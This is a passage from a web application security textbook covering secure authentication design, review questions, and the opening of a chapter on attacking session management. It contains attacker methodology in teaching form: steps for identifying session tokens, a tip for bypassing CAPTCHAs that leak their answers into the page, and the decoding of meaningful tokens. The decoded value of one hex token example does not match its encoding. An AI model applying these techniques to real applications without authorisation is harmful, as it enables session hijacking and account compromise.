with suffi cient entropy that they cannot feasibly be sequenced or predicted ‚Äî even by an attacker who gains access to a large sample of successively generated instances.
n Users should be permitted to set suffi ciently strong passwords. For example, 
long passwords and a wide range of characters should be allowed.
Handle Credentials Secretively
n All credentials should be created, stored, and transmitted in a manner 
that does not lead to unauthorized disclosure.
n All client-server communications should be protected using a wellestablished cryptographic technology, such as SSL. Custom solutions 
for protecting data in transit are neither necessary nor desirable.
n If it is considered preferable to use HTTP for the unauthenticated areas of 
the application, ensure that the login form itself is loaded using HTTPS, 
rather than switching to HTTPS at the point of the login submission.
n Only POST requests should be used to transmit credentials to the server. 
Credentials should never be placed in URL parameters or cookies (even 
ephemeral ones). Credentials should never be transmitted back to the 
client, even in parameters to a redirect.
n All server-side application components should store credentials in a manner that does not allow their original values to be easily recovered, even 
by an attacker who gains full access to all the relevant data within the 
c06.indd 192 c06.indd 192 8/19/2011 12:06:41 PM 8/19/2011 12:06:41 PM
Stuttard c06.indd V3 - 07/22/2011 Page 193
 Chapter 6 n Attacking Authentication 193
application‚Äôs database. The usual means of achieving this objective is to 
use a strong hash function (such as SHA-256 at the time of this writing), 
appropriately salted to reduce the effectiveness of precomputed offl ine 
attacks. The salt should be specifi c to the account that owns the password, 
such that an attacker cannot replay or substitute hash values.
n Client-side ‚Äúremember me‚Äù functionality should in general remember only 
nonsecret items such as usernames. In less security-critical applications, 
it may be considered appropriate to allow users to opt in to a facility to 
remember passwords. In this situation, no cleartext credentials should be 
stored on the client (the password should be stored reversibly encrypted 
using a key known only to the server). Also, users should be warned about 
risks from an attacker who has physical access to their computer or who 
compromises their computer remotely. Particular attention should be paid 
to eliminating cross-site scripting vulnerabilities within the application 
that may be used to steal stored credentials (see Chapter 12).
n A password change facility should be implemented (see the ‚ÄúPrevent 
Misuse of the Password Change Function‚Äù section), and users should be 
required to change their password periodically.
n Where credentials for new accounts are distributed to users out-of-band, 
these should be sent as securely as possible and should be time-limited. 
The user should be required to change them on fi rst login and should be 
told to destroy the communication after fi rst use.
n Where applicable, consider capturing some of the user‚Äôs login information 
(for example, single letters from a memorable word) using drop-down 
menus rather than text fi elds. This will prevent any keyloggers installed 
on the user‚Äôs computer from capturing all the data the user submits. (Note, 
however, that a simple keylogger is only one means by which an attacker 
can capture user input. If he or she has already compromised a user‚Äôs 
computer, in principle an attacker can log every type of event, including 
mouse movements, form submissions over HTTPS, and screen captures.)
Validate Credentials Properly
n Passwords should be validated in full ‚Äî that is, in a case-sensitive way, 
without fi ltering or modifying any characters, and without truncating 
the password.
n The application should be aggressive in defending itself against unexpected events occurring during login processing. For example, depending 
on the development language in use, the application should use catch-all 
exception handlers around all API calls. These should explicitly delete all 
c06.indd 193 c06.indd 193 8/19/2011 12:06:41 PM 8/19/2011 12:06:41 PM
Stuttard c06.indd V3 - 07/22/2011 Page 194
194 Chapter 6 n Attacking Authentication
session and method-local data being used to control the state of the login 
processing and should explicitly invalidate the current session, thereby 
causing a forced logout by the server even if authentication is somehow 
bypassed.
n All authentication logic should be closely code-reviewed, both as pseudocode and as actual application source code, to identify logic errors such 
as fail-open conditions.
n If functionality to support user impersonation is implemented, this should 
be strictly controlled to ensure that it cannot be misused to gain unauthorized access. Because of the criticality of the functionality, it is often 
worthwhile to remove this functionality from the public-facing application and implement it only for internal administrative users, whose use 
of impersonation should be tightly controlled and audited.
n Multistage logins should be strictly controlled to prevent an attacker from 
interfering with the transitions and relationships between the stages:
n All data about progress through the stages and the results of previous 
validation tasks should be held in the server-side session object and 
should never be transmitted to or read from the client.
n No items of information should be submitted more than once by the 
user, and there should be no means for the user to modify data that 
has already been collected and/or validated. Where an item of data 
such as a username is used at multiple stages, this should be stored 
in a session variable when fi rst collected and referenced from there 
subsequently.
n The fi rst task carried out at every stage should be to verify that all 
prior stages have been correctly completed. If this is not the case, the 
authentication attempt should immediately be marked as bad.
n To prevent information leakage about which stage of the login failed 
(which would enable an attacker to target each stage in turn), the application should always proceed through all stages of the login, even 
if the user failed to complete earlier stages correctly, and even if the 
original username was invalid. After proceeding through all the stages, 
the application should present a generic ‚Äúlogin failed‚Äù message at the 
conclusion of the fi nal stage, without providing any information about 
where the failure occurred.
n Where a login process includes a randomly varying question, ensure that 
an attacker cannot effectively choose his own question:
n Always employ a multistage process in which users identify themselves 
at an initial stage and the randomly varying question is presented to 
them at a later stage.
c06.indd 194 c06.indd 194 8/19/2011 12:06:41 PM 8/19/2011 12:06:41 PM
Stuttard c06.indd V3 - 07/22/2011 Page 195
 Chapter 6 n Attacking Authentication 195
n When a given user has been presented with a given varying question, 
store that question within her persistent user profi le, and ensure that 
the same user is presented with the same question on each attempted 
login until she successfully answers it.
n When a randomly varying challenge is presented to the user, store the 
question that has been asked in a server-side session variable, rather 
than a hidden fi eld in an HTML form, and validate the subsequent 
answer against that saved question.
NOTE The subtleties of devising a secure authentication mechanism run 
deep here. If care is not taken in the asking of a randomly varying question, 
this can lead to new opportunities for username enumeration. For example, to 
prevent an attacker from choosing his own question, an application may store 
within each user‚Äôs profi le the last question that user was asked, and continue 
presenting that question until the user answers it correctly. An attacker who 
initiates several logins using any given user‚Äôs username will be met with the 
same question. However, if the attacker carries out the same process using 
an invalid username, the application may behave differently: because no 
user profi le is associated with an invalid username, there will be no stored 
question, so a varying question will be presented. The attacker can use this 
difference in behavior, manifested across several login attempts, to infer the 
validity of a given username. In a scripted attack, he will be able to harvest 
numerous usernames quickly.
If an application wants to defend itself against this possibility, it must go to 
some lengths. When a login attempt is initiated with an invalid username, the 
application must record somewhere the random question that it presented 
for that invalid username and ensure that subsequent login attempts using 
the same username are met with the same question. Going even further, the 
application could switch to a different question periodically to simulate the 
nonexistent user‚Äôs having logged in as normal, resulting in a change in the 
next question! At some point, however, the application designer must draw a 
line and concede that a total victory against such a determined attacker probably is not possible.
Prevent Information Leakage
n The various authentication mechanisms used by the application should 
not disclose any information about authentication parameters, through 
either overt messages or inference from other aspects of the application‚Äôs 
behavior. An attacker should have no means of determining which piece 
of the various items submitted has caused a problem.
n A single code component should be responsible for responding to all failed 
login attempts with a generic message. This avoids a subtle vulnerability 
c06.indd 195 c06.indd 195 8/19/2011 12:06:41 PM 8/19/2011 12:06:41 PM
Stuttard c06.indd V3 - 07/22/2011 Page 196
196 Chapter 6 n Attacking Authentication
that can occur when a supposedly uninformative message returned from 
different code paths can actually be spotted by an attacker due to typographical differences in the message, different HTTP status codes, other 
information hidden in HTML, and the like.
n If the application enforces some kind of account lockout to prevent bruteforce attacks (as discussed in the next section), be careful not to let this 
lead to any information leakage. For example, if an application discloses 
that a specifi c account has been suspended for X minutes due to Y failed 
logins, this behavior can easily be used to enumerate valid usernames. In 
addition, disclosing the precise metrics of the lockout policy enables an 
attacker to optimize any attempt to continue guessing passwords in spite 
of the policy. To avoid enumeration of usernames, the application should 
respond to any series of failed login attempts from the same browser with a 
generic message advising that accounts are suspended if multiple failures 
occur and that the user should try again later. This can be achieved using a 
cookie or hidden fi eld to track repeated failures originating from the same 
browser. (Of course, this mechanism should not be used to enforce any 
actual security control ‚Äî only to provide a helpful message to ordinary 
users who are struggling to remember their credentials.)
n If the application supports self-registration, it can prevent this function 
from being used to enumerate existing usernames in two ways:
n Instead of permitting self-selection of usernames, the application can 
create a unique (and unpredictable) username for each new user, thereby 
obviating the need to disclose that a selected username already exists.
n The application can use e-mail addresses as usernames. Here, the 
fi rst stage of the registration process requires the user to enter her 
e-mail address, whereupon she is told simply to wait for an e-mail 
and follow the instructions contained within it. If the e-mail address 
is already registered, the user can be informed of this in the e-mail. If 
the address is not already registered, the user can be provided with a 
unique, unguessable URL to visit to continue the registration process. 
This prevents the attacker from enumerating valid usernames (unless 
he happens to have already compromised a large number of e-mail 
accounts).
Prevent Brute-Force Attacks
n Measures need to be enforced within all the various challenges implemented by the authentication functionality to prevent attacks that attempt 
to meet those challenges using automation. This includes the login itself, 
c06.indd 196 c06.indd 196 8/19/2011 12:06:41 PM 8/19/2011 12:06:41 PM
Stuttard c06.indd V3 - 07/22/2011 Page 197
 Chapter 6 n Attacking Authentication 197
as well as functions to change the password, to recover from a forgotten 
password situation, and the like.
n Using unpredictable usernames and preventing their enumeration presents 
a signifi cant obstacle to completely blind brute-force attacks and requires 
an attacker to have somehow discovered one or more specifi c usernames 
before mounting an attack.
n Some security-critical applications (such as online banks) simply disable 
an account after a small number of failed logins (such as three). They also 
require that the account owner take various out-of-band steps to reactivate 
the account, such as telephoning customer support and answering a series 
of security questions. Disadvantages of this policy are that it allows an 
attacker to deny service to legitimate users by repeatedly disabling their 
accounts, and the cost of providing the account recovery service. A more 
balanced policy, suitable for most security-aware applications, is to suspend accounts for a short period (such as 30 minutes) following a small 
number of failed login attempts (such as three). This serves to massively 
slow down any password-guessing attack, while mitigating the risk of 
denial-of-service attacks and also reducing call center work.
n If a policy of temporary account suspension is implemented, care should 
be taken to ensure its effectiveness:
n To prevent information leakage leading to username enumeration, the 
application should never indicate that any specifi c account has been 
suspended. Rather, it should respond to any series of failed logins, 
even those using an invalid username, with a message advising that 
accounts are suspended if multiple failures occur and that the user 
should try again later (as just discussed).
n The policy‚Äôs metrics should not be disclosed to users. Simply telling 
legitimate users to ‚Äútry again later‚Äù does not seriously diminish their 
quality of service. But informing an attacker exactly how many failed 
attempts are tolerated, and how long the suspension period is, enables 
him to optimize any attempt to continue guessing passwords in spite 
of the policy.
n If an account is suspended, login attempts should be rejected without 
even checking the credentials. Some applications that have implemented a suspension policy remain vulnerable to brute-forcing because 
they continue to fully process login attempts during the suspension 
period, and they return a subtly (or not so subtly) different message when valid credentials are submitted. This behavior enables 
an effective brute-force attack to proceed at full speed regardless of 
the suspension policy.
c06.indd 197 c06.indd 197 8/19/2011 12:06:42 PM 8/19/2011 12:06:42 PM
Stuttard c06.indd V3 - 07/22/2011 Page 198
198 Chapter 6 n Attacking Authentication
n Per-account countermeasures such as account lockout do not help protect 
against one kind of brute-force attack that is often highly effective ‚Äî iterating through a long list of enumerated usernames, checking a single weak 
password, such as password. For example, if fi ve failed attempts trigger 
an account suspension, this means an attacker can attempt four different 
passwords on every account without causing any disruption to users. In 
a typical application containing many weak passwords, such an attacker 
is likely to compromise many accounts.
The effectiveness of this kind of attack will, of course, be massively reduced 
if other areas of the authentication mechanism are designed securely. If 
usernames cannot be enumerated or reliably predicted, an attacker will 
be slowed down by the need to perform a brute-force exercise in guessing 
usernames. And if strong requirements are in place for password quality, 
it is far less likely that the attacker will choose a password for testing that 
even a single user of the application has chosen.
In addition to these controls, an application can specifi cally protect itself 
against this kind of attack through the use of CAPTCHA (Completely 
Automated Public Turing test to tell Computers and Humans Apart) 
challenges on every page that may be a target for brute-force attacks (see 
Figure 6-9). If effective, this measure can prevent any automated submission 
of data to any application page, thereby keeping all kinds of passwordguessing attacks from being executed manually. Note that much research 
has been done on CAPTCHA technologies, and automated attacks against 
them have in some cases been reliable. Furthermore, some attackers have 
been known to devise CAPTCHA-solving competitions, in which unwitting members of the public are leveraged as drones to assist the attacker. 
However, even if a particular kind of challenge is not entirely effective, it 
will still lead most casual attackers to desist and fi nd an application that 
does not employ the technique.
Figure 6-9: A CAPTCHA control 
designed to hinder automated attacks
TIP If you are attacking an application that uses CAPTCHA controls to hinder automation, always closely review the HTML source for the page where 
the image appears. The authors have encountered cases where the solution 
c06.indd 198 c06.indd 198 8/19/2011 12:06:42 PM 8/19/2011 12:06:42 PM
Stuttard c06.indd V3 - 07/22/2011 Page 199
 Chapter 6 n Attacking Authentication 199
to the puzzle appears in literal form within the ALT attribute of the image 
tag, or within a hidden form fi eld, enabling a scripted attack to defeat the 
protection without actually solving the puzzle itself.
Prevent Misuse of the Password Change Function
n A password change function should always be implemented, to allow 
periodic password expiration (if required) and to allow users to change 
passwords if they want to for any reason. As a key security mechanism, 
this needs to be well defended against misuse.
n The function should be accessible only from within an authenticated session.
n There should be no facility to provide a username, either explicitly or via 
a hidden form fi eld or cookie. Users have no legitimate need to attempt 
to change other people‚Äôs passwords.
n As a defense-in-depth measure, the function should be protected from 
unauthorized access gained via some other security defect in the application ‚Äî such as a session-hijacking vulnerability, cross-site scripting, or 
even an unattended terminal. To this end, users should be required to 
reenter their existing password.
n The new password should be entered twice to prevent mistakes. The application should compare the ‚Äúnew password‚Äù and ‚Äúconfi rm new password‚Äù 
fi elds as its fi rst step and return an informative error if they do not match.
n The function should prevent the various attacks that can be made against 
the main login mechanism. A single generic error message should be used 
to notify users of any error in existing credentials, and the function should 
be temporarily suspended following a small number of failed attempts 
to change the password.
n Users should be notifi ed out-of-band (such as via e-mail) that their password has been changed, but the message should not contain either their 
old or new credentials.
Prevent Misuse of the Account Recovery Function
n In the most security-critical applications, such as online banking, account 
recovery in the event of a forgotten password is handled out-of-band. A 
user must make a telephone call and answer a series of security questions, 
and new credentials or a reactivation code are also sent out-of-band (via 
conventional mail) to the user‚Äôs registered home address. The majority of 
applications do not want or need this level of security, so an automated 
recovery function may be appropriate.
c06.indd 199 c06.indd 199 8/19/2011 12:06:42 PM 8/19/2011 12:06:42 PM
Stuttard c06.indd V3 - 07/22/2011 Page 200
200 Chapter 6 n Attacking Authentication
n A well-designed password recovery mechanism needs to prevent accounts 
from being compromised by an unauthorized party and minimize any 
disruption to legitimate users.
n Features such as password ‚Äúhints‚Äù should never be used, because they 
mainly help an attacker trawl for accounts that have obvious hints set.
n The best automated solution for enabling users to regain control of accounts 
is to e-mail the user a unique, time-limited, unguessable, single-use recovery URL. This e-mail should be sent to the address that the user provided 
during registration. Visiting the URL allows the user to set a new password. After this has been done, a second e-mail should be sent, indicating 
that a password change was made. To prevent an attacker from denying 
service to users by continually requesting password reactivation e-mails, 
the user‚Äôs existing credentials should remain valid until they are changed.
n To further protect against unauthorized access, applications may present 
users with a secondary challenge that they must complete before gaining access to the password reset function. Be sure that the design of this 
challenge does not introduce new vulnerabilities:
n The challenge should implement the same question or set of questions for everyone, mandated by the application during registration. 
If users provide their own challenge, it is likely that some of these will 
be weak, and this also enables an attacker to enumerate valid accounts 
by identifying those that have a challenge set.
n Responses to the challenge should contain suffi cient entropy that they 
cannot be easily guessed. For example, asking the user for the name of 
his fi rst school is preferable to asking for his favorite color.
n Accounts should be temporarily suspended following a number of 
failed attempts to complete the challenge, to prevent brute-force attacks.
n The application should not leak any information in the event of failed 
responses to the challenge ‚Äî regarding the validity of the username, 
any suspension of the account, and so on.
n Successful completion of the challenge should be followed by the 
process described previously, in which a message is sent to the user‚Äôs 
registered e-mail address containing a reactivation URL. Under no 
circumstances should the application disclose the user‚Äôs forgotten 
password or simply drop the user into an authenticated session. Even 
proceeding directly to the password reset function is undesirable. The 
response to the account recovery challenge will in general be easier 
for an attacker to guess than the original password, so it should not 
be relied upon on its own to authenticate the user.
c06.indd 200 c06.indd 200 8/19/2011 12:06:42 PM 8/19/2011 12:06:42 PM
Stuttard c06.indd V3 - 07/22/2011 Page 201
 Chapter 6 n Attacking Authentication 201
Log, Monitor, and Notify
n The application should log all authentication-related events, including 
login, logout, password change, password reset, account suspension, and 
account recovery. Where applicable, both failed and successful attempts 
should be logged. The logs should contain all relevant details (such as 
username and IP address) but no security secrets (such as passwords). 
Logs should be strongly protected from unauthorized access, because 
they are a critical source of information leakage.
n Anomalies in authentication events should be processed by the application‚Äôs real-time alerting and intrusion prevention functionality. For 
example, application administrators should be made aware of patterns 
indicating brute-force attacks so that appropriate defensive and offensive 
measures can be considered.
n Users should be notifi ed out-of-band of any critical security events. For 
example, the application should send a message to a user‚Äôs registered 
e-mail address whenever he changes his password.
n Users should be notifi ed in-band of frequently occurring security events. 
For example, after a successful login, the application should inform users of 
the time and source IP/domain of the last login and the number of invalid 
login attempts made since then. If a user is made aware that her account 
is being subjected to a password-guessing attack, she is more likely to 
change her password frequently and set it to a strong value.
Summary
Authentication functions are perhaps the most prominent target in a typical 
application‚Äôs attack surface. By defi nition, they can be reached by unprivileged, 
anonymous users. If broken, they grant access to protected functionality 
and sensitive data. They lie at the core of the security mechanisms that an 
application employs to defend itself and are the front line of defense against 
unauthorized access.
Real-world authentication mechanisms contain a myriad of design and implementation fl aws. An effective assault against them needs to proceed systematically, using a structured methodology to work through every possible avenue of 
attack. In many cases, open goals present themselves ‚Äî bad passwords, ways to 
fi nd out usernames, vulnerability to brute-force attacks. At the other end of the 
spectrum, defects may be very hard to uncover. They may require meticulous 
examination of a convoluted login process to establish the assumptions being 
c06.indd 201 c06.indd 201 8/19/2011 12:06:42 PM 8/19/2011 12:06:42 PM
Stuttard c06.indd V3 - 07/22/2011 Page 202
202 Chapter 6 n Attacking Authentication
made and to help you spot the subtle logic fl aw that can be exploited to walk 
right through the door.
The most important lesson when attacking authentication functionality is to 
look everywhere. In addition to the main login form, there may be functions to 
register new accounts, change passwords, remember passwords, recover forgotten 
passwords, and impersonate other users. Each of these presents a rich target of 
potential defects, and problems that have been consciously eliminated within 
one function often reemerge within others. Invest the time to scrutinize and 
probe every inch of attack surface you can fi nd, and your rewards may be great.
Questions
Answers can be found at http://mdsec.net/wahh.
 1. While testing a web application, you log in using your credentials of joe
and pass. During the login process, you see a request for the following 
URL appear in your intercepting proxy:
http://www.wahh-app.com/app?action=login&uname=joe&password=pass
What three vulnerabilities can you diagnose without probing any further?
 2. How can self-registration functions introduce username enumeration 
vulnerabilities? How can these vulnerabilities be prevented?
 3. A login mechanism involves the following steps:
 (a) The application requests the user‚Äôs username and passcode.
 (b) The application requests two randomly chosen letters from the user‚Äôs 
memorable word.
Why is the required information requested in two separate steps? What 
defect would the mechanism contain if this were not the case?
 4. A multistage login mechanism fi rst requests the user‚Äôs username and 
then various other items across successive stages. If any supplied item is 
invalid, the user is immediately returned to the fi rst stage.
What is wrong with this mechanism, and how can the vulnerability be 
corrected?
 5. An application incorporates an antiphishing mechanism into its login 
functionality. During registration, each user selects a specifi c image from 
a large bank of memorable images that the application presents to her. 
The login function involves the following steps:
 (a) The user enters her username and date of birth.
c06.indd 202 c06.indd 202 8/19/2011 12:06:42 PM 8/19/2011 12:06:42 PM
Stuttard c06.indd V3 - 07/22/2011 Page 203
 Chapter 6 n Attacking Authentication 203
 (b) If these details are correct, the application shows the user her chosen 
image; otherwise, a random image is displayed.
 (c) The user verifi es whether the correct image is displayed. If it is, she 
enters her password.
The idea behind this antiphishing mechanism is that it enables the user 
to confi rm that she is dealing with the authentic application, not a clone, 
because only the real application knows the correct image to display to 
the user.
What vulnerability does this antiphishing mechanism introduce into the 
login function? Is the mechanism effective at preventing phishing?
c06.indd 203 c06.indd 203 8/19/2011 12:06:42 PM 8/19/2011 12:06:42 PM
Stuttard c06.indd V3 - 07/22/2011 Page 204
c06.indd 204 c06.indd 204 8/19/2011 12:06:42 PM 8/19/2011 12:06:42 PM
Stuttard c07.indd V3 - 07/22/2011 Page 205
205
 C H A P T E R 
7
Attacking Session Management
The session management mechanism is a fundamental security component in 
the majority of web applications. It is what enables the application to uniquely 
identify a given user across a number of different requests and to handle 
the data that it accumulates about the state of that user‚Äôs interaction with the 
application. Where an application implements login functionality, session management is of particular importance, because it is what enables the application 
to persist its assurance of any given user‚Äôs identity beyond the request in which 
he supplies his credentials.
Because of the key role played by session management mechanisms, they 
are a prime target for malicious attacks against the application. If an attacker 
can break an application‚Äôs session management, she can effectively bypass its 
authentication controls and masquerade as other application users without 
knowing their credentials. If an attacker compromises an administrative user 
in this way, the attacker can own the entire application.
As with authentication mechanisms, a wide variety of defects can commonly 
be found in session management functions. In the most vulnerable cases, an 
attacker simply needs to increment the value of a token issued to him by the 
application to switch his context to that of a different user. In this situation, 
the application is wide open for anyone to access all areas. At the other end 
of the spectrum, an attacker may have to work extremely hard, deciphering 
several layers of obfuscation and devising a sophisticated automated attack, 
before fi nding a chink in the application‚Äôs armor.
c07.indd 205 c07.indd 205 8/19/2011 12:07:38 PM 8/19/2011 12:07:38 PM
Stuttard c07.indd V3 - 07/22/2011 Page 206
206 Chapter 7 n Attacking Session Management
This chapter looks at all the types of weakness the authors have encountered 
in real-world web applications. It sets out in detail the practical steps you need 
to take to fi nd and exploit these defects. Finally, it describes the defensive measures that applications should take to protect themselves against these attacks.
COMMON MYTH
‚ÄúWe use smartcards for authentication, and users‚Äô sessions cannot be compromised without them.‚Äù
However robust an application‚Äôs authentication mechanism, subsequent 
requests from users are only linked back to that authentication via the resulting session. If the application‚Äôs session management is fl awed, an attacker 
can bypass the robust authentication and still compromise users.
The Need for State
The HTTP protocol is essentially stateless. It is based on a simple request-response 
model, in which each pair of messages represents an independent transaction. 
The protocol itself contains no mechanism for linking the series of requests 
made by a particular user and distinguishing these from all the other requests 
received by the web server. In the early days of the Web, there was no need for 
any such mechanism: websites were used to publish static HTML pages for 
anyone to view. Today, things are very different.
The majority of web ‚Äúsites‚Äù are in fact web applications. They allow you to 
register and log in. They let you buy and sell goods. They remember your preferences the next time you visit. They deliver rich multimedia experiences with 
content created dynamically based on what you click and type. To implement 
any of this functionality, web applications need to use the concept of a session.
The most obvious use of sessions is in applications that support logging in. 
After entering your username and password, you can use the application as 
the user whose credentials you have entered, until you log out or the session 
expires due to inactivity. Without a session, a user would have to reenter his 
password on every page of the application. Hence, after authenticating the user 
once, the application creates a session for him and treats all requests belonging 
to that session as coming from that user.
Applications that do not have a login function also typically need to use sessions. Many sites selling merchandise do not require customers to create accounts. 
However, they allow users to browse the catalog, add items to a shopping basket, 
provide delivery details, and make a payment. In this scenario, there is no need 
to authenticate the user‚Äôs identity: for the majority of his visit, the application 
does not know or care who the user is. But to do business with him, it needs to 
know which series of requests it receives originated from the same user.
c07.indd 206 c07.indd 206 8/19/2011 12:07:38 PM 8/19/2011 12:07:38 PM
Stuttard c07.indd V3 - 07/22/2011 Page 207
 Chapter 7 n Attacking Session Management 207
The simplest and still most common means of implementing sessions is to 
issue each user a unique session token or identifi er. On each subsequent request 
to the application, the user resubmits this token, enabling the application to 
determine which sequence of earlier requests the current request relates to.
In most cases, applications use HTTP cookies as the transmission mechanism 
for passing these session tokens between server and client. The server‚Äôs fi rst 
response to a new client contains an HTTP header like the following:
Set-Cookie: ASP.NET_SessionId=mza2ji454s04cwbgwb2ttj55
and subsequent requests from the client contain this header:
Cookie: ASP.NET_SessionId=mza2ji454s04cwbgwb2ttj55
This standard session management mechanism is inherently vulnerable to 
various categories of attack. An attacker‚Äôs primary objective in targeting the 
mechanism is to somehow hijack the session of a legitimate user and thereby 
masquerade as that person. If the user has been authenticated to the application, 
the attacker may be able to access private data belonging to the user or carry 
out unauthorized actions on that person‚Äôs behalf. If the user is unauthenticated, 
the attacker may still be able to view sensitive information submitted by the 
user during her session.
As in the previous example of a Microsoft IIS server running ASP.NET, most 
commercial web servers and web application platforms implement their own 
off-the-shelf session management solution based on HTTP cookies. They provide 
APIs that web application developers can use to integrate their own sessiondependent functionality with this solution.
Some off-the-shelf implementations of session management have been found to 
be vulnerable to various attacks, which results in users‚Äô sessions being compromised (these are discussed later in this chapter). In addition, some developers fi nd 
that they need more fi ne-grained control over session behavior than is provided 
for them by the built-in solutions, or they want to avoid some vulnerabilities 
inherent in cookie-based solutions. For these reasons, it is fairly common to see 
bespoke and/or non-cookie-based session management mechanisms used in 
security-critical applications such as online banking.
The vulnerabilities that exist in session management mechanisms largely 
fall into two categories:
n Weaknesses in the generation of session tokens
n Weaknesses in the handling of session tokens throughout their life cycle
We will look at each of these areas in turn, describing the different types of 
defects that are commonly found in real-world session management mechanisms, and practical techniques for discovering and exploiting these. Finally, 
we will describe measures that applications can take to defend themselves 
against these attacks.
c07.indd 207 c07.indd 207 8/19/2011 12:07:38 PM 8/19/2011 12:07:38 PM
Stuttard c07.indd V3 - 07/22/2011 Page 208
208 Chapter 7 n Attacking Session Management
HACK STEPS
In many applications that use the standard cookie mechanism to transmit 
session tokens, it is straightforward to identify which item of data contains 
the token. However, in other cases this may require some detective work.
 1. The application may often employ several different items of data collectively as a token, including cookies, URL parameters, and hidden form 
fields. Some of these items may be used to maintain session state on different back-end components. Do not assume that a particular parameter 
is the session token without proving it, or that sessions are being tracked 
using only one item.
 2. Sometimes, items that appear to be the application‚Äôs session token may 
not be. In particular, the standard session cookie generated by the web 
server or application platform may be present but not actually used by the 
application.
 3. Observe which new items are passed to the browser after authentication. 
Often, new session tokens are created after a user authenticates herself.
 4. To verify which items are actually being employed as tokens, find a page 
that is definitely session-dependent (such as a user-specific ‚Äúmy details‚Äù 
page). Make several requests for it, systematically removing each item 
that you suspect is being used as a token. If removing an item causes 
the session-dependent page not to be returned, this may confirm that the 
item is a session token. Burp Repeater is a useful tool for performing 
these tests.
Alternatives to Sessions
Not every web application employs sessions, and some security-critical applications containing authentication mechanisms and complex functionality opt to 
use other techniques to manage state. You are likely to encounter two possible 
alternatives:
n HTTP authentication ‚Äî Applications using the various HTTP-based 
authentication technologies (basic, digest, NTLM) sometimes avoid the 
need to use sessions. With HTTP authentication, the client component 
interacts with the authentication mechanism directly via the browser, 
using HTTP headers, and not via application-specifi c code contained 
within any individual page. After the user enters his credentials into a 
browser dialog, the browser effectively resubmits these credentials (or 
reperforms any required handshake) with every subsequent request to 
the same server. This is equivalent to an application that uses HTML 
forms-based authentication and places a login form on every application 
page, requiring users to reauthenticate themselves with every action they 
perform. Hence, when HTTP-based authentication is used, it is possible 
c07.indd 208 c07.indd 208 8/19/2011 12:07:38 PM 8/19/2011 12:07:38 PM
Stuttard c07.indd V3 - 07/22/2011 Page 209
 Chapter 7 n Attacking Session Management 209
for an application to reidentify the user across multiple requests without 
using sessions. However, HTTP authentication is rarely used on Internetbased applications of any complexity, and the other versatile benefi ts 
that fully fl edged session mechanisms offer mean that virtually all web 
applications do in fact employ these mechanisms.
n Sessionless state mechanisms ‚Äî Some applications do not issue session 
tokens to manage the state of a user‚Äôs interaction with the application. 
Instead, they transmit all data required to manage that state via the client, 
usually in a cookie or a hidden form fi eld. In effect, this mechanism uses 
sessionless state much like the ASP.NET ViewState does. For this type 
of mechanism to be secure, the data transmitted via the client must be 
properly protected. This usually involves constructing a binary blob 
containing all the state information and encrypting or signing this using 
a recognized algorithm. Suffi cient context must be included within the 
data to prevent an attacker from collecting a state object at one location 
within the application and submitting it to another location to cause some 
undesirable behavior. The application may also include an expiration time 
within the object‚Äôs data to perform the equivalent of session timeouts. 
Chapter 5 describes in more detail secure mechanisms for transmitting 
data via the client.
HACK STEPS
 1. If HTTP authentication is being used, it is possible that no session management mechanism is implemented. Use the methods described previously to 
examine the role played by any token-like items of data.
 2. If the application uses a sessionless state mechanism, transmitting all 
data required to maintain state via the client, this may sometimes be 
difficult to detect with certainty, but the following are strong indicators 
that this kind of mechanism is being used:
n Token-like data items issued to the client are fairly long (100 or more bytes).
n The application issues a new token-like item in response to every request.
n The data in the item appears to be encrypted (and therefore has no 
discernible structure) or signed (and therefore has a meaningful structure 
accompanied by a few bytes of meaningless binary data).
n The application may reject attempts to submit the same item with more 
than one request.
 3. If the evidence suggests strongly that the application is not using session 
tokens to manage state, it is unlikely that any of the attacks described in 
this chapter will achieve anything. Your time probably would be better 
spent looking for other serious issues such as broken access controls or 
code injection.
c07.indd 209 c07.indd 209 8/19/2011 12:07:39 PM 8/19/2011 12:07:39 PM
Stuttard c07.indd V3 - 07/22/2011 Page 210
210 Chapter 7 n Attacking Session Management
Weaknesses in Token Generation
Session management mechanisms are often vulnerable to attack because tokens 
are generated in an unsafe manner that enables an attacker to identify the values 
of tokens that have been issued to other users.
NOTE There are numerous locations where an application‚Äôs security 
depends on the unpredictability of tokens it generates. Here are some 
examples:
n Password recovery tokens sent to the user‚Äôs registered e-mail address
n Tokens placed in hidden form fi elds to prevent cross-site request forgery 
attacks (see Chapter 13)
n Tokens used to give one-time access to protected resources
n Persistent tokens used in ‚Äúremember me‚Äù functions
n Tokens allowing customers of a shopping application that does not use 
authentication to retrieve the current status of an existing order
The considerations in this chapter relating to weaknesses in token generation 
apply to all these cases. In fact, because many of today‚Äôs applications rely on 
mature platform mechanisms to generate session tokens, it is often in these 
other areas of functionality that exploitable weaknesses in token generation 
are found.
Meaningful Tokens
Some session tokens are created using a transformation of the user‚Äôs username 
or e-mail address, or other information associated with that person. This information may be encoded or obfuscated in some way and may be combined with 
other data.
For example, the following token may initially appear to be a long random 
string:
757365723d6461663b6170703d61646d696e3b646174653d30312f31322f3131
However, on closer inspection, you can see that it contains only hexadecimal 
characters. Guessing that the string may actually be a hex encoding of a string 
of ASCII characters, you can run it through a decoder to reveal the following:
user=daf;app=admin;date=10/09/11
c07.indd 210 c07.indd 210 8/19/2011 12:07:39 PM 8/19/2011 12:07:39 PM
Stuttard c07.indd V3 - 07/22/2011 Page 211
 Chapter 7 n Attacking Session Management 211
Attackers can exploit the meaning within this session token to attempt to 
guess the current sessions of other application users. Using a list of enumerated 
or common usernames, they can quickly generate large numbers of potentially 
valid tokens and test these to confi rm which are valid.
Tokens that contain meaningful data often exhibit a structure. In other words, 
they contain several components, often separated by a delimiter, that can be 
extracted and analyzed separately to allow an attacker to understand their 
function and means of generation. Here are some components that may be 
encountered within structured tokens:
n The account username
n The numeric identifi er that the application uses to distinguish between 
accounts
n The user‚Äôs fi rst and last names
n The user‚Äôs e-mail address
n The user‚Äôs group or role within the application
n A date/time stamp
n An incrementing or predictable number
n The client IP address
Each different component within a structured token, or indeed the entire 
token, may be encoded in different ways. This can be a deliberate measure to 
obfuscate their content, or it can simply ensure safe transport of binary data via 
HTTP. Encoding schemes that are commonly encountered include XOR, Base64, 
and hexadecimal representation using ASCII characters (see Chapter 3). It may 
be necessary to test various decodings on each component of a structured token 
to unpack it to its original form.
NOTE When an application handles a request containing a structured token, 
it may not actually process every component with the token or all the data 
contained in each component. In the previous example, the application may 
Base64-decode the token and then process only the ‚Äúuser‚Äù and ‚Äúdate‚Äù components. In cases where a token contains a blob of binary data, much of this 
